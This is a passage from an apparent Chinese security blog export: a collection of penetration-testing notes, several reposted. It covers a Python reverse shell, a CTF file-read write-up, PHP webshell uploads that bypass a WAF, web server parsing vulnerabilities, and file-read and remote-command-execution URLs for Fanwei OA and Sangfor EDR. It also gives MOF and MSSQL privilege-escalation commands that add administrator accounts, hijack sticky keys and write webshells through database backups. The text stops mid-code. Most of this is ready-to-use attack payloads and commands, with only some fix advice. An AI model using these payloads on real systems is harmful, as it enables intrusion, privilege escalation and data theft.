&lt;我们自己机器的ip&gt; -p 2333 就可以连接服务器执行命令，演示效果如下，主机是kali，靶机是ubuntu： 0x04 总结除了python，其他语言也能实现这些功能，具体使用哪种语言根据目标系统存在的环境来选择，而linux系统都是集成了python环境的，所以这里用python做例子。 在留后门的过程中，重点并不是写出这个shell，而是如何隐藏它不被发现，下一次有时间会总结一下隐藏shell的各种方式。 转自：http://next.uuzdaisuki.com/2018/06/17/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9Eshell%E5%92%8C%E5%8F%8D%E5%B0%84shell/","link":"/2020/09/09/web%E6%B8%97%E9%80%8F/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9E%E5%9E%8Bshell%E5%92%8C%E5%8F%8D%E5%B0%84%E5%9E%8Bshell/"},{"title":"攻防世界_web_cat","text":"题目 解析0x01 判断题目类型 看起来像个注入的框，但是试了很多select、update、order by等没有丝毫回显，感觉应该也不是被过滤了。 又觉得是个命令执行，它提示输入域名，那就随便输baidu.com或其他的，但是又没有用，也没有回显。 意外输入127.0.0.1 有了回显，原来这里传参去做ping了 之后又尝试命令执行，但是均被屏蔽。 127.0.0.1 &amp;&amp; dir 127.0.0.1 &amp;&amp; ls 127.0.0.1 || ls 但是网站url编码均能够传入 0x02 命令执行 | 模糊测试 url边界值测试，均可以引起报错 %80 ~ %8f 牛逼的大佬们总是能够认清各种事物，比如： 这是DJanggo框架报错。 题目提示去看curl的用法（反正我是没看到在哪） curk除了传输文本还可以用@+文件路径把文件传输过去 在报错界面中翻到了很多的文件路径，如： /opt/api/dnsapi/utils.py /opt/api/dnsapi/views.py 挨个实验，查找关键词curl、database、ctf等，最后payload： url=@/opt/api/database.sqlite3 最后寻找到flag WHCTF{yoooo_Such_A_G00D_@}","link":"/2019/08/16/web%E6%B8%97%E9%80%8F/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_web_cat/"},{"title":"文件上传绕waf","text":"综述 文件上传实质上还是客户端的post请求，消息主题是一些上传信息。前端上传界面需要制定enctype为multipart/from-data 才能正常上传文件。 此处不讲各种中间件解析漏洞，只列举几种safe_dog对脚本文件上传拦截的绕过。 靶机环境：win2003+safe_dog4.0.23957+webug中的上传 1、换行123456Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;Content-Type: image/jpeg&lt;?php @eval($_POST[1])?&gt;-----------------------------127619278770 2、多个等号 (不止2，3个)12345Content-Disposition: form-data; name=&quot;file&quot;; filename==&quot;2.php&quot;Content-Type: image/jpeg&lt;?php @eval($_POST[1])?&gt;-----------------------------127619278770 12345Content-Disposition: form-data; name=&quot;file&quot;; filename===&quot;3.php&quot;Content-Type: image/jpeg&lt;?php @eval($_POST[1])?&gt;-----------------------------127619278770 3、00截断12345Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;4.php%00&quot;Content-Type: image/jpeg&lt;?php @eval($_POST[1])?&gt;-----------------------------127619278770 4、文件名+；号12345Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;6;.php&quot;Content-Type: image/jpeg&lt;?php phpinfo()?&gt;-----------------------------127619278770 5、文件名+‘12345Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;7'.php&quot;Content-Type: image/jpeg&lt;?php phpinfo()?&gt;-----------------------------127619278770 6、上传.htaccess12345Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;.htaccess&quot;Content-Type: image/jpegAddType application/x-httpd-php jpg-----------------------------127619278770 然后再去正常的上传一个jpg文件，内容写为 最后访问8.jpg 以php解析 7、参考：https://www.t00ls.net/viewthread.php?tid=51253&amp;highlight=%E5%AE%89%E5%85%A8%E7%8B%97 https://www.t00ls.net/viewthread.php?tid=50690&amp;highlight=%E5%AE%89%E5%85%A8%E7%8B%97 转载自T9Sec Team","link":"/2019/10/16/web%E6%B8%97%E9%80%8F/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95waf/"},{"title":"文件解析漏洞总结","text":"​ 文件解析漏洞,是指Web容器（Apache、nginx、iis等）在解析文件时出现了漏洞,以其他格式执行出脚本格式的效果。从而,黑客可以利用该漏洞实现非法文件的解析。 **总结一些常见服务器（WEB server）的解析漏洞 Apache解析漏洞多后缀产生原因在Apache1.x，2.x中Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。因此我可以上传一个test.php.qwea文件绕过验证且服务器依然会将其解析为php。Apache能够认识的文件在mime.types文件里 修复方案后缀验证尽量使用白名单的方式，这样即使使用不存在的后缀名，也无法绕过。 配置问题导致漏洞产生原因 如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。 如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg即使扩展名是 jpg，一样能以 php 方式执行。 修复方案1. apache配置文件，禁止.php.这样的文件执行，配置文件里面加入 1234&lt;Files ~ “.(php.|php3.)”&gt; Order Allow,Deny Deny from all&lt;/Files&gt; 2.用伪静态能解决这个问题，重写类似.php.\\*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下: 1234567891011&lt;IfModule mod_rewrite.c&gt;RewriteEngine OnRewriteRule .(php.|php3.) /index.phpRewriteRule .(pHp.|pHp3.) /index.phpRewriteRule .(phP.|phP3.) /index.phpRewriteRule .(Php.|Php3.) /index.phpRewriteRule .(PHp.|PHp3.) /index.phpRewriteRule .(PhP.|PhP3.) /index.phpRewriteRule .(pHP.|pHP3.) /index.phpRewriteRule .(PHP.|PHP3.) /index.php&lt;/IfModule&gt; 附：Apache的模块配置Apache 本身的架构是一个核心＋外围的 Module，它的配置也遵循这个结构， mod_rewrite是其中一个模块，语法规则如下： 1234567891011&lt;IfModule mod_rewrite.c &gt; RewriteEngine On # 拼 URL 时使用的前缀 RewriteBase / # test string 可以用一堆常量，例如 %{REQUEST_URI} # CondPattern 可以是正则表达式，也可以是一些其它的 test，例如文件是否存在 # 默认是 AND，可以换成 [OR] RewriteCond TestString CondPattern [OR] # 支持 backref RewriteRule Pattern Substitution [flags]&lt;/IfModuel&gt; 罕见后缀Apache配置文件中会有.+.ph(p[345]?|t|tml)此类的正则表达式，被php程序执行的文件名要符合正则表达式，否则就算Apache把某文件当php程序，php自己不认它，也是无用。也就是说php3，php4，php5，pht，phtml也是可以被解析的。我在本地测试只有php3可以，应该是配置文件的问题，不过我并没有找到对应的正则表达式配置文件。 PHTML，正如其命名方式：是一种PHP脚本嵌在网页的HTML代码之中的文件。在页面被发送给请求的用户之前，后台服务器调用PHP来解释和执行PHP脚本。用后缀为phtml来标识这类php文件中嵌套着HTML代码 例如后缀为php+数字的文件： 用来标识当前php文件所采用的php开发版本，例如’php3’, ‘php4’, ‘php5’,’php7’对应了php的3、4、5、7版本号 .htaccessApache使.htacess生效条件一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——.htaccess（分布式配置文件）要想使.htaccess文件生效，需要两个条件: 一是在Apache的配置文件中写上：**AllowOverride All 若这样写则.htaccess不会生效：AllowOverride None** **二是Apache要加载mod_Rewrite模块。加载该模块，需要在Apache的配置文件中写上：LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so** **若是在Ubuntu中，可能还需要执行命令： sudo a2enmod rewrite 配置完后需要重启Apache。 .htacess作用**.htaccess文件可以配置很多事情，如是否开启站点的图片缓存、自定义错误页面、自定义默认文档、设置WWW域名重定向、设置网页重定向、设置图片防盗链和访问权限控制。但我们这里只关心.htaccess文件的一个作用——MIME类型修改。如在.htaccess文件中写入： AddType application/x-httpd-php xxx 就成功地使该.htaccess文件所在目录及其子目录中的后缀为.xxx的文件被Apache当做php文件。 **另一种写法是： 123&lt;FilesMatch &quot;shell.jpg&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 该语句会让Apache把shell.jpg文件解析为php文件。 这里拿2018 巅峰极客CTF BabyWEB 这道题举例：前面的过程不再细说，网上有详细的WP ，这里主要讲如何利用.htaccess文件成功getshell。登陆后台后发现后台功能十分简单，只有个上传功能可以使用，上传后只有提示对错，得不到上传路径。**nmap扫描发现3306开放用hydra爆破mysql密码：1q2w3e4r5t6y。远程连接数据库，发现backinfo表，这个表的type字段是用来限制上传的文件后缀的。在type里面添加php php5后缀都不能成功上传，但是添加.htaccess可以上传.htaccess文件。我们先上传一个.htaccess来控制解析，然后再上传我们的shell在白名单中加入webshell后缀，我们再上传.webshell后缀的一句话便可以成功getshell。 shell文件名地址可以从数据库中读取出来Getshell成功* Nginx解析漏洞PHP CGI解析漏洞原理Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写当访问xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI。 Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI 但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了 12www.xxxx.com/UploadFiles/image/1.jpg/1.php www.xxxx.com/UploadFiles/image/1.jpg/%20\\0.php 另外一种手法：上传一个名字为test.jpg，以下内容的文件。 1&lt;?PHP ?&gt;');?&gt; 然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。 注：其实这种手法同第一种并无差异，还是利用了php的可执行性。 这个解析漏洞其实是PHP CGI的漏洞，在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析。这个往前递归的功能原本是想解决/info.php/test这种URL，能够正确解析到info.php。 在Nginx配置fastcgi使用php时，会存在文件类型解析问题。其实可以说它与Nginx本身关系不大，Nginx只是作为一个代理把请求转发给fastcgi Server，PHP在后端处理这一切。因此在其他fastcgi环境下，PHP也存在此问题，只是使用Nginx作为Web Server时，一般使用fastcgi的方式调用脚本解释器，这种使用方式最为常见。 防御方法1）使用Apache、IIS等成熟久经考验的服务器软件，在动态语言的支持上，Nginx还是太年经了。你应该也偶尔会见到有些网站挂掉了显示个nginx错误出来，却极少见网站挂掉显示不是nginx的(未备案，过期欠费 等等除外)。2）上传目录、静态资源（CSS/JS/图片等）目录，都设置好屏蔽PHP执行权限。例如使用Apache服务器的在相应目录下放一个 .htaccess 文件，里面写上 123&lt;FilesMatch &quot;(?i:\\.php)$&quot;&gt; Deny from all&lt;/FilesMatch&gt; 3）可以不提供原图访问，所有图片输出时都经过程序处理，也可以在上传存储时就处理一遍根本不保存原图； 3）可以不提供原图访问，所有图片输出时都经过程序处理，也可以在上传存储时就处理一遍根本不保存原图； 4）图片使用不同的服务器，这样可以与业务代码数据完全隔离，即使图片服务器被黑了，也不会泄漏多少信息； 5)cgi.fix_pathinfo=0慎用，除非你十分确定该服务器上的所有项目都不会因此而无法运行。 空字节代码执行漏洞旧版本（0.5.*，**0.6.*，0.7，0.8&lt;=0.7.65&lt;=0.8.37）。通过利用此漏洞，攻击者可以导致服务器使用PHP的FastCGI作为PHP的服务器上执行任何公开访问的文件。 恶意用户发出请求http://example.com/file.ext％00.php就会将file.ext作为PHP文件解析。 如果一个攻击者可以控制文件的内容（即：使用头像上传形式）其结果是执行任意代码。Ngnix在遇到%00空字节时与后端FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码。 修复1.禁止在上传文件目录下执行php。在nginx虚拟机配置或者fcgi.conf配置加如下代码 123456if ($request_filename ~* (.*)\\.php) { set $php_url $1;}if (!-e $php_url.php) { return 403;} 2.升级到最新版本的nginx IIS5.x-6.x解析漏洞使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语言一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。 目录解析(6.0)形式：www.xxx.com/xx.asp/xx.jpg原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。 文件解析（6.0）形式：www.xxx.com/xx.asp;.jpg原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。 解析文件类型有的网站在上传检测中会用”黑名单”方法 ,但是IIS6.0 默认的可执行文件除了asp还包含这三种 : 123/test.asa/test.cer/test.cdx iis为什么会把asa，cdx，cer解析成asp文件：原因是这四种扩展名都是用的同一个asp.dll文件来执行。 修复1.目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传xx.asp;.jpg类型的文件名。2.做好权限设置，限制用户创建文件夹。 IIS7.5解析漏洞IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。跟nginx解析漏洞一样，要在php.ini cgi.fix_pathinfo=1 开启的情况才会产生。 可以配合操作系统文件命名规则，上传不符合windows文件命名规则的文件名 1234test.asp.test.asp(空格)test.php:1.jpgtest.php:: $DATA # php在window的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::$DATA&quot;之前的文件名 会被windows系统自动去掉不符合规则符号后面的内，然后再配合这个解析漏洞来执行文件。 %00截断条件：php 版本&lt;5.3.4 filename=test.php%00.txt 1.上传时路径可控，使用00截断 2.文件下载时，00截断绕过白名单检查 3.文件包含时，00截断后面限制(主要是本地包含时) 4.其它与文件操作有关的地方都可能使用00截断。 其他在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点,黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单.若上传成功，空格和点都会被windows自动消除,这样也可以getshell。这种方法可以配合文件解析漏洞从而产生更大的杀伤力。 转载自：https://www.smi1e.top/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","link":"/2020/07/26/web%E6%B8%97%E9%80%8F/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"},{"title":"泛微OA云桥任意文件读取和目录遍历漏洞","text":"泛微OA云桥任意文件读取和目录遍历漏洞未授权任意文件读取,/wxjsapi/saveYZJFile接口获取filepath,输入文件路径-&gt;读取文件内容。返回数据包内出现了程序的绝对路径,攻击者可以通过返回内容识别程序运行路径从而下载数据库配置文件危害可见。 1、 downloadUrl参数修改成需要获取文件的绝对路径,记录返回包中的id值。 2、通过查看文件接口访问 /file/fileNoLogin/id 想到一个新的思路，能够在漏洞利用过程中找到更多有用的信息。 1、简单说说昨天泛微云桥的报告,输入文件路径-&gt;读取文件内容,我们读了一下代码后发现这还能读取文件目录。 2、参数不填写绝对路径写进文本内容就是当前的目录,产生了一个新的漏洞 “目录遍历” 3、目录遍历+文件读取,我们能做的事情就很多了,比如读取管理员在桌面留下的密码文件、数据库配置文件、nginx代理配置、访问日志、D盘迅雷下载。 d://ebridge//tomcat//webapps//ROOT//WEB-INF//classes//init.properties d:/OA/tomcat8/webapps/OAMS/WEB-INF/classes/dbconfig.properties 泛微OA数据库 修复建议: 关闭程序路由 /file/fileNoLogin","link":"/2020/09/14/web%E6%B8%97%E9%80%8F/%E6%B3%9B%E5%BE%AEOA%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"title":"深信服edr漏洞分析","text":"EDR简介终端检测响应平台（EDR）是深信服公司提供的一套终端安全解决方案，方案由轻量级的端点安全软件（Agent）和管理平台（MGR）共同组成。 漏洞复现： 远程命令执行漏洞CNVD-2020-46552https://ip+端口/tool/log/c.php?strip_slashes=system&amp;host=id 漏洞分析： 将c.php中的文件进行分析 $_REQUEST将传入的参数保存为数组，将前台的参数传入到$show_form 进入$show_form 使用了匿名函数，use调用了外部变量$strip_slashes、$show_input extract()函数会从数组中将变量导入到当前的符号表。他会把数组变成变量，函数使用数组的键名为变量名，键值为变量值 $host是如果存在就执行$strip_slashes($host) 那么传参数的时候使用:strip_slashes=system&amp;host=id strip_slashes函数的作用是去掉&amp;变量中的\\ 后台任意用户登陆漏洞只要用户存在直接就可以登录 https://ip:xx/ui/login.php?user=任意用户名，如https://ip:xx/ui/login.php?user=admin 来源：https://blog.csdn.net/qq_32393893/article/details/108077482","link":"/2020/09/09/web%E6%B8%97%E9%80%8F/%E6%B7%B1%E4%BF%A1%E6%9C%8Dedr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"MOF提权","text":"0x00 原理利用了c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。 0x01 利用条件具备Mysql的root权限 0x02 提权关键导入nullevt.mof 0x03 提权步骤1、生成 nullevt.mof文件,上传文件到可写目录 12345678910111213141516171819202122#pragma namespace(“\\\\\\\\.\\\\root\\\\subscription”)instance of __EventFilter as $EventFilter{EventNamespace = “Root\\\\Cimv2”;Name = “filtP2”;Query = “Select * From __InstanceModificationEvent ““Where TargetInstance Isa \\”Win32_LocalTime\\” ““And TargetInstance.Second = 5”;QueryLanguage = “WQL”;};instance of ActiveScriptEventConsumer as $Consumer{Name = “consPCSV2”;ScriptingEngine = “JScript”;ScriptText =“var WSH = new ActiveXObject(\\”WScript.Shell\\”)\\nWSH.run(\\”net.exe user quan 123 /add\\”)“;};instance of __FilterToConsumerBinding{Consumer = $Consumer;Filter = $EventFilter;}; 2、执行导入命令把我们的提权命令将 nullevt.mof 导入到c:/windows/system32/wbem/mof/目录 1select load_file(“G:/test/nullevt.mof”) into dumpfile “c:/windows/system32/wbem/mof/nullevt.mof” 导入后，系统会自动运行该文件。3、将提权脚本中添加用户命令修改为提升至administrators组：net.exe localgroup administrators quan /add，再次上传并导入 为了更高的成功率，我们必须分开两次导入该脚本。第一次为添加用户，第二次对添加的用户进行提权。 添加用户 1net.exe user quan 123 /add 对添加的用户进行提权 1net.exe localgroup administrators quan /add 4、net user查看用户 0x04 参考《网络攻防实战研究——漏洞利用与提权》https://www.cnblogs.com/wh4am1/p/6613770.html https://www.cnblogs.com/0nc3/p/12071337.html","link":"/2020/08/05/web%E6%B8%97%E9%80%8F/0.%E6%8F%90%E6%9D%83/MOF%E6%8F%90%E6%9D%83/"},{"title":"MSSQL数据库提权总结","text":"0x00 SQLServer提权基础1、SQLServer权限列出sql server 角色用户的权限按照从最低级别角色(bulkadmin)到最高级别角色(sysadmin)的顺序进行描述: 1.bulkadmin:这个角色可以运行BULK INSERT语句.该语句允许从文本文件中将数据导入到SQL Server2008数据库中,为需要执行大容量插入到数据库的域帐号而设计.2.dbcreator:这个角色可以创建,更改,删除和还原任何数据库.不仅适合助理DBA角色,也可能适合开发人员角色.3.diskadmin:这个角色用于管理磁盘文件,比如镜像数据库和添加备份设备.适合助理DBA4.processadmin:SQL Server 2008可以同时多进程处理.这个角色可以结束进程(在SQL Server 2008中称为”删除”)5.public:有两大特点:第一,初始状态时没有权限;第二,所有数据库用户都是它的成员6.securityadmin:这个角色将管理登录名及其属性.可以授权,拒绝和撤销服务器级/数据库级权限.可以重置登录名和密码7.serveradmin:这个角色可以更改服务器范围的配置选项和关闭服务器8.setupadmin:为需要管理联接服务器和控制启动的存储过程的用户而设计.9.sysadmin:这个角色有权在SQL Server 2008 中执行任何操作. 2、常见SQL Server提权命令（1）查看数据库版本 1select @@version （2）查看数据库版本 1select @@version （3）查看数据库系统参数 1exec master..xp_msver; （4）查看用户所属角色信息 1sp_helpsrvrolemember （5）查看当前数据库 1select db_name(); （6）显示机器上的驱动器 1xp_availablemedia （7）查看当前账户权限 12select IS_SRVROLEMEMBER('sysadmin') #判断是否为sa权限select IS_MEMBER('db_owner') #判断是否为dba权限 （8）开启xp_cmdshell 12exec sp_configure 'show advanced options', 1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure; （9）关闭xp_cmdshell 12exec sp_configure 'show advanced options', 1;reconfigure;exec sp_configure 'xp_cmdshell', 0;reconfigure; （10）禁用advanced options 1EXEC sp_configure 'show advanced options',0;GO RECONFIGURE; （11）sp_OACreate执行命令 1234DECLARE @js intEXEC sp_OACreate 'ScriptControl',@js OUTEXEC sp_OASetProperty @js,'Language','JavaScript'ActiveXObject(&quot;Shell.Users&quot;);z=o.create(&quot;user&quot;);z.changePassword(&quot;pass&quot;,&quot;&quot;);z.setting(&quot;AccountType&quot;)=3;' （12）sp_OACreate移动文件 123declare @aa intexec sp_oacreate 'scripting.filesystemobject' @aa outexec sp_oamethod @aa, 'moveFile',null,'c:\\temp\\ipmi.log','c:\\temp\\ipmi1.log'; （13）sp_OACreate复制文件 123declare @o intexec sp_oacreate 'scripting.filesystemobject', @o outexec sp_oamethod @o,'copyfile',null,'c:\\windows\\explorer.exe','c:\\windows\\system32\\sethc.exe'; （14）sp_OACreate删除文件 12345DECLARE @Result intDECLARE @FSO_Token intEXEC @Result = sp_OACreate 'Scripting.FileSystemObject', @FSO_Token OUTPUTEXEC @Result = sp_OAMethod @FSO_Token, 'DeleteFile',NULL,'c:\\Documents and Settings\\All Users\\ [开始] 菜单\\程序\\启动\\user.bat'EXEC @Result = sp_OADestrop @FSO_Token 0x01 SQLServer提权方法根据当前拥有的权限分为如下两种情况来进行SQL Server的提权。 0x02在SA权限下存在xp_cmdshell如果存在xp_cmdshell，使用xp_cmdshell执行命令添加用户，当出现错误可以恢复和开启xp_cmdshell（1）测试xp_cmdshell是否可以执行 1exec master..xp_cmdshell 'ver' 获取操作系统版本（2）添加管理员用户添加用户 1exec master.dbo.xp_cmdshell 'net user quan 123456 /add' 添加至管理员组 1exec master.dbo.xp_cmdshell 'net localgroup administrators quan /add' 0x03在SA权限下使用sp_OACreate执行命令当xp_cmdshell无法使用时，可以使用sp_OACreate执行命令开启sp_OACreate 12exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ola Automation Procedures' , 1;RECONFIGURE; 使用wscript.shell直接添加系统帐户查询分离器连接后,xp或2003server系统下使用: 12declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c net user quan 123456 /add'declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c net localgroup administrators quan /add' 其他操作如下： （1）sp_OACreate替换粘贴键123456declare @o intexec sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o, 'copyfile',null,'c:\\windows\\explorer.exe' ,'c:\\windows\\system32\\sethc.exe';declare @o intexec sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o, 'copyfile',null,'c:\\windows\\system32\\sethc.exe' ,'c:\\windows\\system32\\dllcache\\sethc.exe'; 需要同时具备sp_oacreate 和sp_oamethod 两个功能组件。成功后3389登陆按五次shift键。成功进入服务器。一直向上点”我的电脑“右键“管理” 用户管理直接加用户。 （2）Shell.Application执行命令declare @o intexec sp_oacreate ‘Shell.Application’, @o outexec sp_oamethod @o, ‘ShellExecute’,null, ‘cmd.exe’,’cmd /c net user &gt;c:\\test.txt’,’c:\\windows\\system32’,’’,’1’;orexec sp_oamethod @o, ‘ShellExecute’,null, ‘user.vbs’,’’,’c:’,’’,’1’; （3）使用wscript.shell执行命令1234use masterdeclare @o intexec sp_oacreate 'wscript.shell',@o outexec sp_oamethod @o,'run',null,'cmd /c &quot;net user&quot; &gt; c:\\test.tmp' public提权操作123456789101112131415 USE msdbEXEC sp_add_job @job_name = 'GetSystemOnSQL', www.webshell.cc@enabled = 1,@description = 'This will give a low privileged user access toxp_cmdshell',@delete_level = 1EXEC sp_add_jobstep @job_name = 'GetSystemOnSQL',@step_name = 'Exec my sql',@subsystem = 'TSQL',@command = 'exec master..xp_execresultset N''select ''''execmaster..xp_cmdshell &quot;dir &gt; c:\\agent-job-results.txt&quot;'''''',N''Master'''EXEC sp_add_jobserver @job_name = 'GetSystemOnSQL',@server_name = 'SERVER_NAME'EXEC sp_start_job @job_name = 'GetSystemOnSQL' 0x04 在SA权限下沙盒提权沙盒模式是数据库的一种安全功能.在沙盒模式下,只对控件和字段属性中的安全且不含恶意代码的表达式求值.如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的。 使用场景：无法执行命令时，xp_regwrite可用(使用条件) （1）首先检查xp_cmdshell是 否开启 1select count(*) from master.dbo.sysobjects where xtyoe='x' and name='xp_cmdshell' （2）开启沙盒模式： 1exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',1 SandBoxMode参数含义（默认是2）0：在任何所有者中禁止启用安全模式1 ：为仅在允许范围内2 ：必须在access模式下3：完全开启 （3）利用jet.oledb执行系统命令添加用户 1select * from openrowset('microsoft.jet.oledb.4.0' ,';database=c:\\windows\\system32\\ias\\ias.mdb' ,'select shell(&quot;cmd.exe /c net user quan 121345 /add&quot;)') （4）将quan用户添加至管理员组 1select * from openrowset('microsoft.jet.oledb.4.0' ,';database=c:\\windows\\system32\\ias\\ias.mdb' ,'select shell(&quot;cmd.exe /c net localgroup administrators quan /add&quot;)') openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。 0x05在SA权限下 注册表劫持粘贴键当只有xp_regwrite可用时可以劫持粘滞键（sethc.exe)，使用xp_regwrite修改注册表 1exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Image File Execution Options\\sethc.EXE','Debugger','REG_SZ','C:\\WINDOWS\\explorer.exe'; 0x06 DBA权限下通过备份到网站目录getshellDBA权限下通过备份文件提权步骤如下 两种备份方式如下 （1）差异备份1234backup database 库名 to disk = 'c:\\quan.bak';//完整备份一次(保存位置可以改)create table cmd (a image);insert into cmd(a) values(&lt;%execute(request(&quot;a&quot;))%&gt;);//创建表cmd并插入一句话木马backup database 库名 to disk='目标位置\\hhh.asp' WITH DIFFERENTIAL,FORMAT;//进行差异备份 （2）LOG备份LOG备份需要先把指定的数据库激活为还原模式，所以需要执行alter database XXX set RECOVERY FUL，而差异备份不需要，所以只有这条语句的就是LOG备份 1234alter database 数据库名称 set RECOVERY FULL;create table cmd (a image);backup log 数据库名称 to disk = 'E:\\wwwroot\\asp_sqli\\hack.asp' with init;insert into cmd (a) values ('&lt;%%25Execute(request(&quot;go&quot;))%%25&gt;'); ;backup log 数据库名称 to disk = ‘E:\\wwwroot\\asp_sqli\\hack2.asp’ – 0x07 DBA权限下通过备份文件到启动项提权（1）先测试xp_cmdshell是否可用 1exec master..xp_cmdshell 'ver' 提示权限拒绝，说明是db_owner权限. （2）利用xp_dirtree列目录 1exec master..xp_dirtree 'c:\\',1,1 （3）查看启动项 1exec master..xp_dirtree 'C:\\Documents and Settings\\Administrator\\「开始」菜单\\程序\\启动',1,1 （4）列数据库 1SELECT DB_NAME() （5）利用url或者sql查询器log备份bat或一句话 123456alter database [northwind] set RECOVERY FULL--create table cmd (a image)--backup log [northwind] to disk = 'c:\\cmd1' with init--insert into cmd (a) values (0x130A0D0A404563686F206F66660D0A406364202577696E646972250D0A4064656C20646972202F73202F612073657468632E6578650D0A40636F7079202577696E646972255C73797374656D33325C636D642E657865202577696E646972255C73797374656D33325C73657468632E657865202F790D0A40636F7079202577696E646972255C73797374656D33325C636D642E657865202577696E646972255C73797374656D33325C646C6C63616368655C73657468632E657865202F790D0A)--backup log [northwind] to disk = 'C:\\Documents and Settings\\Administrator\\「开始」菜单\\程序\\启动\\start.bat'--drop table cmd-- （6）再去查看一下启动项就有一个bat了 1exec master..xp_dirtree 'C:\\Documents and Settings\\Administrator\\「开始」菜单\\程序\\启动',1,1 0x08利用SQL Server CLR提权Microsoft SQL Server 现在具备与 Microsoft Windows .NET Framework的公共语言运行时 (CLR) 组件集成的功能CLR 为托管代码提供服务，例如跨语言集成、代码访问安全性、对象生存期管理以及调试和分析支持。对于 SQL Server 用户和应用程序开发人员来说CLR 集成意味着您现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）编写存储过程、触发器、用户定义类型、用户定义函数（标量函数和表值函数）以及用户定义的聚合函数。要通过此种方式来执行命令，也有几个前提： 1、在SQL Server上能启用CLR并可以创建自定义存储过程2、SQL Server当前账号具有执行命令/代码所需要的权限 创建CLR有两种方式第一种就是通过DLL创建 1CREATE ASSEMBLY AssemblyName from ‘DLLPath’ 第二种就是通过文件十六进制流 1CREATE ASSEMBLY AssemblyName from 文件十六进制流 1、安装Visual Studio和SQL Server数据库，此次测试使用了VS2017跟SQL2012。2、创建一个新的SQL Server数据库项目3、设置项目属性，目标平台修改为需要的目标平台，如SQL Server 2012;将SQLCLR权限级别修改为UNSAFE；修改.Net 框架版本为自己需要的版本；语言选择C#4、右键项目，选择添加-&gt;新建项，新建SQL CLR C# 存储过程5、填入以下测试代码： 123456789101112131415161718192021using System;using System.Data;using System.Data.SqlClient;using System.Data.SqlTypes;using Microsoft.SqlServer.Server;using 